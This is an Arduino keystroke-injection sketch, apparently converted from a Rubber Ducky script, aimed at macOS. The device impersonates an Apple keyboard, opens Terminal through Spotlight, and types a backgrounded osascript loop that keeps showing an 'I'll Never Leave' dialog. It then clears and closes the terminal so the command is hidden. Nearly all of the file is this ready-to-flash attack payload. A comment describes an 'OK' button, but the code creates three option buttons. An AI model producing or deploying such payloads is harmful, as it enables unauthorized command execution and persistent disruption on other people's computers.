// Generated with <3 by Dckuino.js !

#include "Keyboard.h"
void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Code Begins Here

  // This script opens an infinite dialog box on MacOS
  // that continuously displays the message "I'll Never Leave" with an "OK" button.
  // It runs in the background using the nohup command.
  // The script then clears the terminal and exits.
  // To end the loop you need to Kill the PID
  // In the terminal, use the command "pgrep osascript" to find the PID of the dialog box loop
  // Run the command 'Kill PID #' to end the dialog box loop
  // Author: Narsty
  // Title: Infinite Dialog Box
  // Target: MacOS
  // Version: 1.0
  // Category: Executions
  // ID 05ac:021e Apple:Keyboard
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("nohup osascript -e 'repeat' -e 'set dialogResult to button returned of (display dialog \"I'\"'\"'ll Never Leave\" buttons {\"Option 1\", \"Option 2\", \"Option 3\"} default button 1)' -e 'end repeat' >/dev/null 2>&1 &");

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('k');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  // Ending stream
  Keyboard.end();
}

/* endless loop */
void loop() {}